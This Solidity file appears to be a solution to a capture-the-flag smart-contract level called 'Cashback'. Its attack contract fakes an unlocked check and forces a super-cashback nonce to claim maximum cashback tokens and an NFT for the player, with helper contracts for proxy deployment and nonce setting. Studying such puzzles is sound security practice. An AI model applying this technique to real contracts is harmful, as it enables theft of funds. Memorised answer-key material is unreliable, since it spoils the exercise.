// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {IERC721} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721.sol";
import {Currency, Cashback} from "src/levels/Cashback.sol";

contract CashbackAttack {
    uint256 internal constant SUPERCASHBACK_NONCE = 10000;
    Currency constant NATIVE_CURRENCY = Currency.wrap(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
    uint256 constant NATIVE_AMOUNT = 200 ether;
    uint256 constant FREE_COIN_AMOUNT = 25000 ether;
    uint256 constant NATIVE_MAX_CASHBACK = 1 ether;
    uint256 constant FREE_MAX_CASHBACK = 500 ether;

    uint256 private nonce;

    function attack(Cashback cashback, address freeCoin, address player) external {
        nonce = SUPERCASHBACK_NONCE;
        Currency freeCoinCurrency = Currency.wrap(freeCoin);

        cashback.accrueCashback(NATIVE_CURRENCY, NATIVE_AMOUNT);
        cashback.accrueCashback(freeCoinCurrency,FREE_COIN_AMOUNT);

        cashback.safeTransferFrom(address(this), player, NATIVE_CURRENCY.toId(), NATIVE_MAX_CASHBACK, "");
        cashback.safeTransferFrom(address(this), player, freeCoinCurrency.toId(), FREE_MAX_CASHBACK, "");

        IERC721(cashback.superCashbackNFT()).transferFrom(address(this), player, uint256(uint160(address(this))));
    }
    function consumeNonce() external returns (uint256) {
        return nonce++;
    }

    function isUnlocked() public view returns (bool) {
        return true;
    }
}

contract CashbackProxyDeployer {
    constructor(bytes memory runtimeCode){
        assembly{
            return(add(runtimeCode, 0x20), mload(runtimeCode))
        }
    }
}

contract CashbackAttackNonceSetter layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba03 {
    uint256 public nonce;
    function setNonce(uint256 newNonce) external { nonce = newNonce; }
}